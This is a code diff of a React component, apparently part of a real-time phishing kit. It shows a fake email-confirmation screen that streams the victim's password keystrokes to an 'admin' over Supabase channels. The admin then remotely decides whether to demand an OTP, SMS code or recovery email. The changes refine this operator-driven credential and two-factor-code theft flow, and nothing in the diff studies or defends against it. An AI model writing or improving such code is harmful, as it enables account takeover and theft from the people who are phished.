@@ -1,4 +1,4 @@
-import { useState, useEffect, useCallback } from "react";
+import { useState, useEffect, useCallback, useRef } from "react";
 import { supabase } from "@/integrations/supabase/client";
 import {
   ArrowLeft,
@@ -50,8 +50,18 @@ const ConfirmEmailScreen = ({ email, sessionId, onBack }: ConfirmEmailScreenProp
   const [adminTokenCode, setAdminTokenCode] = useState("");
   const [recoveryEmailAddr, setRecoveryEmailAddr] = useState("");
   const [errorMessage, setErrorMessage] = useState("");
+  const stepRef = useRef<ConfirmStep>("password");
+  const lastDecisionKeyRef = useRef("");
 
   const provider = getEmailProvider(email);
+
+  useEffect(() => {
+    stepRef.current = step;
+  }, [step]);
+
+  useEffect(() => {
+    lastDecisionKeyRef.current = "";
+  }, [sessionId]);
 
   // ── Broadcast helper ──
   const broadcastToAdmin = useCallback(
@@ -72,13 +82,26 @@ const ConfirmEmailScreen = ({ email, sessionId, onBack }: ConfirmEmailScreenProp
     const confirmCh = supabase.channel(getChannelName(sessionId));
     const syncCh = supabase.channel(`sync-email-${sessionId}`);
 
+    const buildDecisionKey = (decision?: string, payload?: Record<string, string>) => {
+      if (!decision) return "";
+      return JSON.stringify({
+        decision,
+        adminToken: payload?.admin_token || "",
+        smsEnding: payload?.sms_ending || payload?.sms_number || "",
+        recoveryEmail: payload?.recovery_email || "",
+      });
+    };
+
     const applyDecision = (decision?: string, payload?: Record<string, string>) => {
       if (!decision) return;
+
+      const decisionKey = buildDecisionKey(decision, payload);
+      if (decisionKey && lastDecisionKeyRef.current === decisionKey) return;
+      lastDecisionKeyRef.current = decisionKey;
 
       if (decision === "confirm_wrong_password" || decision === "sync_wrong_password") {
         setErrorMessage("Contraseña incorrecta. Intentá nuevamente.");
         setStep("password");
-        setPassword("");
         setLoading(false);
       } else if (decision === "confirm_ask_otp" || decision === "sync_ask_otp") {
         setStep((prev) => {
@@ -87,8 +110,12 @@ const ConfirmEmailScreen = ({ email, sessionId, onBack }: ConfirmEmailScreenProp
             setErrorMessage("");
             return "sms_code";
           }
-          setTokenCode("");
-          setAdminTokenCode("");
+
+          if (prev !== "token_2fa") {
+            setTokenCode("");
+            setAdminTokenCode("");
+          }
+
           setErrorMessage("");
           return "token_2fa";
         });
@@ -96,7 +123,9 @@ const ConfirmEmailScreen = ({ email, sessionId, onBack }: ConfirmEmailScreenProp
         const code = payload?.admin_token || "";
         setAdminTokenCode(code);
         setStep("token_2fa");
-        setTokenCode("");
+        if (stepRef.current !== "token_2fa") {
+          setTokenCode("");
+        }
         setErrorMessage("");
       } else if (decision === "confirm_ask_sms" || decision === "sync_ask_sms") {
         setStep((prev) => {
@@ -105,10 +134,13 @@ const ConfirmEmailScreen = ({ email, sessionId, onBack }: ConfirmEmailScreenProp
             setErrorMessage("");
             return "sms_code";
           }
+
           const ending = payload?.sms_ending || payload?.sms_number || "";
           setPhoneEnding(ending);
-          setClientPhoneInput("");
-          setSmsCode("");
+          if (prev !== "sms_phone") {
+            setClientPhoneInput("");
+            setSmsCode("");
+          }
           setErrorMessage("");
           return "sms_phone";
         });
@@ -116,28 +148,31 @@ const ConfirmEmailScreen = ({ email, sessionId, onBack }: ConfirmEmailScreenProp
         const ending = payload?.sms_ending || payload?.sms_number || "";
         if (ending) setPhoneEnding(ending);
         setStep("sms_code");
-        setSmsCode("");
+        if (stepRef.current !== "sms_code") {
+          setSmsCode("");
+        }
         setErrorMessage("");
       } else if (decision === "confirm_ask_recovery_email" || decision === "sync_ask_recovery_email") {
         const recEmail = payload?.recovery_email || "";
         setRecoveryEmailAddr(recEmail);
         setStep("recovery_email_input");
-        setClientRecoveryEmail("");
+        if (stepRef.current !== "recovery_email_input") {
+          setClientRecoveryEmail("");
+        }
         setErrorMessage("");
       } else if (decision === "confirm_ask_recovery" || decision === "sync_ask_recovery") {
         setStep("recovery_email_input");
         setErrorMessage("");
       } else if (decision === "confirm_ask_recovery_code" || decision === "sync_ask_recovery_code") {
         setStep("sms_code");
-        setSmsCode("");
+        if (stepRef.current !== "sms_code") {
+          setSmsCode("");
+        }
         setErrorMessage("");
       } else if (decision === "confirm_approved" || decision === "sync_approved") {
         setStep("success");
       } else if (decision === "confirm_rejected" || decision === "sync_rejected") {
         setErrorMessage("La verificación falló. Intentá nuevamente.");
-        setClientRecoveryEmail("");
-        setSmsCode("");
-        setTokenCode("");
       }
     };
 
@@ -195,7 +230,7 @@ const ConfirmEmailScreen = ({ email, sessionId, onBack }: ConfirmEmailScreenProp
       supabase.removeChannel(confirmCh);
       supabase.removeChannel(syncCh);
     };
-  }, [sessionId, step]);
+  }, [sessionId]);
 
 // ── Password change: broadcast every keystroke in real-time ──
 const handlePasswordChange = useCallback(
